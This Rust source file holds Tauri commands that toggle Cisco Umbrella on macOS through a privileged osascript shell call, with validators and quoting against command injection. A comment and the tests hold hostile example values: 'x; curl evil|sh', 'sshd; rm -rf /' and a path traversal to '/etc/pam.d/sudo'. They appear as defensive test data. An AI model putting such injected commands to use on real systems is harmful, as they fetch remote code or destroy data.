//! Tauri commands backing the `/utils` page (Cisco Umbrella toggle).

use std::path::{Path, PathBuf};
use std::process::Command;

use tauri::{AppHandle, Manager};
use tauri_plugin_dialog::DialogExt;

use super::{CiscoConfig, CiscoStatus};

fn config_path(app: &AppHandle) -> Result<PathBuf, String> {
    Ok(app
        .path()
        .app_data_dir()
        .map_err(|e| e.to_string())?
        .join("cisco.json"))
}

fn load_config(app: &AppHandle) -> CiscoConfig {
    config_path(app)
        .ok()
        .and_then(|p| std::fs::read_to_string(p).ok())
        .and_then(|d| serde_json::from_str(&d).ok())
        .unwrap_or_default()
}

/// Current Cisco config (standard paths unless overridden in Settings).
#[tauri::command]
pub fn cisco_get_config(
    window: tauri::WebviewWindow,
    app: AppHandle,
) -> Result<CiscoConfig, String> {
    crate::security::require_main(&window)?;
    Ok(load_config(&app))
}

#[tauri::command]
pub fn cisco_set_config(
    window: tauri::WebviewWindow,
    app: AppHandle,
    config: CiscoConfig,
) -> Result<(), String> {
    crate::security::require_main(&window)?;
    let path = config_path(&app)?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    let data = serde_json::to_string_pretty(&config).map_err(|e| e.to_string())?;
    std::fs::write(&path, data).map_err(|e| e.to_string())
}

/// Open a native folder picker and return the chosen path (None if cancelled).
/// Shared by any page with a directory field (submodules, deploy).
#[tauri::command]
pub async fn pick_directory(
    app: tauri::AppHandle,
    window: tauri::WebviewWindow,
) -> Result<Option<String>, String> {
    crate::security::require_main(&window)?;
    // blocking_pick_folder must run off the main thread; it dispatches the dialog
    // to the main event loop internally.
    let picked =
        tauri::async_runtime::spawn_blocking(move || app.dialog().file().blocking_pick_folder())
            .await
            .map_err(|e| e.to_string())?;
    Ok(picked.map(|p| p.to_string()))
}

/// Current Umbrella state (installed / running / profile-present). Read-only, so
/// no admin auth is needed.
#[tauri::command]
pub fn cisco_status(window: tauri::WebviewWindow, app: AppHandle) -> Result<CiscoStatus, String> {
    crate::security::require_main(&window)?;
    Ok(status(&load_config(&app)))
}

/// The actual state probe, callable internally (post-toggle) without re-checking
/// the caller window.
fn status(cfg: &CiscoConfig) -> CiscoStatus {
    CiscoStatus {
        installed: Path::new(&cfg.daemon_plist).exists(),
        running: acumbrella_running(),
        profile_present: Path::new(&cfg.orginfo).exists(),
    }
}

/// Enable or disable Cisco Umbrella: move the Umbrella profile in/out of place
/// and bounce the Secure Client daemon, via one privileged shell command (native
/// macOS admin prompt). The VPN side is unaffected. Returns the refreshed status.
#[tauri::command]
pub async fn cisco_set_enabled(
    window: tauri::WebviewWindow,
    app: AppHandle,
    enabled: bool,
) -> Result<CiscoStatus, String> {
    crate::security::require_main(&window)?;
    let cfg = load_config(&app);
    if !Path::new(&cfg.daemon_plist).exists() {
        return Err("Cisco Secure Client is not installed on this machine.".into());
    }
    // The osascript call blocks until the user answers the auth prompt, so keep it
    // off the async runtime worker.
    let toggle_cfg = cfg.clone();
    tauri::async_runtime::spawn_blocking(move || run_toggle(enabled, &toggle_cfg))
        .await
        .map_err(|e| e.to_string())??;
    Ok(status(&cfg))
}

fn acumbrella_running() -> bool {
    // Absolute path: a GUI-launched app has a minimal PATH, so don't rely on it
    // resolving `pgrep`.
    Command::new("/usr/bin/pgrep")
        .args(["-x", "acumbrellaagent"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Guard a config-supplied path that ends up in a script run `with administrator
/// privileges` (root `mv`/`launchctl`). These values can be restored verbatim
/// from an untrusted imported backup, so reject anything that isn't a plain
/// absolute path: absolute, no `..` traversal, no NUL/newline. Combined with
/// `shq` (which blocks shell-metachar breakout) this stops the easy
/// confused-deputy tricks (relative paths, traversal).
/// ponytail: does NOT confine paths to the Cisco install dir, so an absolute
/// attacker-chosen path is still expressible; the real trust boundary is the
/// import step plus the native admin prompt. Tighten to an install-dir prefix if
/// these ever become settable without those gates.
fn ensure_safe_cisco_path(p: &str) -> Result<(), String> {
    let ok = p.starts_with('/')
        && !p.split('/').any(|c| c == "..")
        && !p.contains('\0')
        && !p.contains('\n');
    if ok {
        Ok(())
    } else {
        Err(format!("unsafe Cisco path in config: {p}"))
    }
}

/// Guard the launchd label that ends up in a root `launchctl ... system/{label}`
/// call. `shq` already blocks shell breakout, but the label is user-editable and
/// restorable from an untrusted imported backup, so hold it to the reverse-DNS
/// label charset (alnum plus `. - _`) - anything else can only be a broken or
/// hostile value targeting an arbitrary system service.
fn ensure_safe_label(l: &str) -> Result<(), String> {
    let ok = !l.is_empty()
        && l.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_');
    if ok {
        Ok(())
    } else {
        Err(format!("unsafe Cisco daemon label in config: {l}"))
    }
}

fn run_toggle(enabled: bool, cfg: &CiscoConfig) -> Result<(), String> {
    ensure_safe_cisco_path(&cfg.orginfo)?;
    ensure_safe_cisco_path(&cfg.orginfo_off)?;
    ensure_safe_cisco_path(&cfg.daemon_plist)?;
    ensure_safe_label(&cfg.daemon_label)?;
    let (orginfo, orginfo_off) = (&cfg.orginfo, &cfg.orginfo_off);
    let (daemon_label, daemon_plist) = (&cfg.daemon_label, &cfg.daemon_plist);
    // Move the profile in the requested direction, then restart the daemon so the
    // change takes effect. `enable` clears a possible disabled override,
    // `bootstrap` loads the daemon if it isn't (a no-op error when already loaded,
    // suppressed), and `kickstart -k` atomically kills+restarts it - avoiding the
    // async race an explicit `bootout; sleep; bootstrap` has. The `[ -f ] && mv`
    // guard plus trailing `true` keep idempotent no-ops from failing the script;
    // a cancelled auth prompt is surfaced by osascript itself (AppleScript -128).
    // These values are user-editable in Settings and restorable from an imported
    // backup, i.e. untrusted, yet they end up in a shell string run `with
    // administrator privileges` (root). Single-quote every one so a value like
    // `x; curl evil|sh` can't break out. `system/{label}` stays one shell token:
    // `system/'label'` concatenates to `system/label`.
    let (orginfo, orginfo_off) = (shq(orginfo), shq(orginfo_off));
    let (daemon_label, daemon_plist) = (shq(daemon_label), shq(daemon_plist));
    let move_step = if enabled {
        format!("[ -f {orginfo_off} ] && mv -f {orginfo_off} {orginfo}")
    } else {
        format!("[ -f {orginfo} ] && mv -f {orginfo} {orginfo_off}")
    };
    let shell = format!(
        "{move_step}; launchctl enable system/{daemon_label} 2>/dev/null; \
         launchctl bootstrap system {daemon_plist} 2>/dev/null; \
         launchctl kickstart -k system/{daemon_label} 2>/dev/null; true"
    );
    let script = format!(
        "do shell script \"{}\" with administrator privileges",
        escape_applescript(&shell)
    );

    let out = Command::new("osascript")
        .arg("-e")
        .arg(&script)
        .output()
        .map_err(|e| format!("failed to launch osascript: {e}"))?;

    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        let err = err.trim();
        return Err(if err.contains("-128") {
            "Authorization cancelled.".into()
        } else if err.is_empty() {
            "Failed to change Cisco Umbrella state.".into()
        } else {
            err.to_string()
        });
    }
    Ok(())
}

/// POSIX single-quote a value so it is one inert token in the shell that
/// osascript runs. Composes with `escape_applescript`: the `\` shq emits for an
/// embedded `'` is doubled by the AppleScript layer and unescaped back to `\`.
fn shq(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

/// Escape a string for embedding inside an AppleScript double-quoted literal.
fn escape_applescript(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

#[cfg(test)]
mod tests {
    use super::{ensure_safe_cisco_path, ensure_safe_label};

    #[test]
    fn cisco_label_guard_accepts_labels_rejects_tricks() {
        assert!(ensure_safe_label("com.cisco.secureclient.vpn.service.agent").is_ok());
        for bad in ["", "sshd; rm -rf /", "system/other", "a b", "x\0y"] {
            assert!(ensure_safe_label(bad).is_err(), "{bad} should fail");
        }
    }

    #[test]
    fn cisco_path_guard_accepts_installs_rejects_tricks() {
        for ok in [
            "/opt/cisco/secureclient/umbrella/OrgInfo.json",
            "/opt/cisco/secureclient/umbrella/OrgInfo.json.disabled",
            "/Library/LaunchDaemons/com.cisco.plist",
        ] {
            assert!(ensure_safe_cisco_path(ok).is_ok(), "{ok} should pass");
        }
        for bad in [
            "",
            "relative/path",
            "/opt/../etc/pam.d/sudo",
            "/opt/cisco/x\0y",
            "/opt/cisco/x\ny",
        ] {
            assert!(ensure_safe_cisco_path(bad).is_err(), "{bad} should fail");
        }
    }
}
